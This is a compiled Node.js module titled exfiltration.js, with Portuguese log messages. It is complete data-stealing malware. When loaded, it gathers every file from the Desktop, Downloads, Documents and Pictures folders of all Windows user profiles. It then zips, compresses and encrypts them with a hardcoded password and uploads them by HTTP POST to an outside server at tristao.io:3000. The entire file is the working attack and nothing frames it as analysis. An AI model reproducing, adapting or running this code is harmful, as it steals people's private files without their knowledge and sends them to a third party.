"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const zlib_1 = __importDefault(require("zlib"));
const crypto_1 = __importDefault(require("crypto"));
const archiver_1 = __importDefault(require("archiver"));
const http_1 = __importDefault(require("http"));
const form_data_1 = __importDefault(require("form-data"));
function collectDataFromFolder(folderPath) {
    let collectedData = [];
    try {
        if (fs_1.default.existsSync(folderPath)) {
            const files = fs_1.default.readdirSync(folderPath);
            files.forEach((file) => {
                const filePath = path_1.default.join(folderPath, file);
                try {
                    if (fs_1.default.statSync(filePath).isFile()) {
                        collectedData.push(filePath);
                    }
                    else if (fs_1.default.statSync(filePath).isDirectory()) {
                        collectedData = collectedData.concat(collectDataFromFolder(filePath));
                    }
                }
                catch (error) {
                    console.error(`Erro ao processar o arquivo/diretório ${filePath}:`, error);
                }
            });
        }
    }
    catch (error) {
        console.error(`Erro ao acessar o diretório ${folderPath}:`, error);
    }
    return collectedData;
}
function createZipFromFiles(files, outputPath) {
    return new Promise((resolve, reject) => {
        const archive = archiver_1.default('zip', {
            zlib: { level: 9 },
        });
        const output = fs_1.default.createWriteStream(outputPath);
        archive.on('error', (err) => reject(err));
        archive.pipe(output);
        files.forEach((file) => {
            archive.file(file, { name: path_1.default.basename(file) });
        });
        archive.finalize();
        output.on('close', () => resolve());
    });
}
function collectDataFromUsers() {
    const usersData = [];
    try {
        const userProfiles = fs_1.default.readdirSync('C:\\Users');
        userProfiles.forEach((user) => {
            const userDirectory = path_1.default.join('C:\\Users', user);
            const foldersToCheck = ['Desktop', 'Downloads', 'Documents', 'Pictures'];
            foldersToCheck.forEach((folder) => {
                const folderPath = path_1.default.join(userDirectory, folder);
                try {
                    const data = collectDataFromFolder(folderPath);
                    usersData.push(...data);
                }
                catch (error) {
                    console.error(`Erro ao coletar dados da pasta ${folderPath}:`, error);
                }
            });
        });
    }
    catch (error) {
        console.error('Erro ao listar perfis de usuários:', error);
    }
    return usersData;
}
function compressData(data) {
    try {
        return zlib_1.default.gzipSync(data);
    }
    catch (error) {
        console.error('Erro ao comprimir dados:', error);
        return null;
    }
}
function encryptData(data, password) {
    try {
        const algorithm = 'aes-256-cbc';
        const key = crypto_1.default.scryptSync(password, 'salt', 32);
        const iv = crypto_1.default.randomBytes(16);
        // @ts-ignore
        const cipher = crypto_1.default.createCipheriv(algorithm, key, iv);
        let encrypted = cipher.update(data);
        // @ts-ignore
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        return { encrypted, iv };
    }
    catch (error) {
        console.error('Erro ao criptografar dados:', error);
        return null;
    }
}
function exfiltrateData(encryptedData, iv) {
    try {
        const form = new form_data_1.default();
        form.append('file', encryptedData, { filename: 'data.enc' });
        form.append('iv', iv.toString('hex'));
        const requestOptions = {
            method: 'POST',
            headers: form.getHeaders(),
        };
        const req = http_1.default.request('http://tristao.io:3000/upload', requestOptions, (res) => {
            console.log(`Response status: ${res.statusCode}`);
        });
        form.pipe(req);
    }
    catch (error) {
        console.error('Erro ao exfiltrar dados:', error);
    }
}
async function execute() {
    const password = 'decrypt';
    try {
        const collectedData = collectDataFromUsers();
        console.log('Dados coletados de usuários:', collectedData.length);
        const zipPath = path_1.default.join(__dirname, 'collectedData.zip');
        await createZipFromFiles(collectedData, zipPath);
        console.log('Arquivo zip criado com sucesso.');
        const zipBuffer = fs_1.default.readFileSync(zipPath);
        const compressedData = compressData(zipBuffer);
        if (compressedData) {
            console.log('Dados comprimidos.');
            const encryptedData = encryptData(compressedData, password);
            if (encryptedData) {
                console.log('Dados criptografados.');
                exfiltrateData(encryptedData.encrypted, encryptedData.iv);
                console.log('Dados exfiltrados.');
            }
        }
    }
    catch (error) {
        console.error('Erro durante a execução:', error);
    }
}
execute();
exports.default = execute;
//# sourceMappingURL=exfiltration.js.map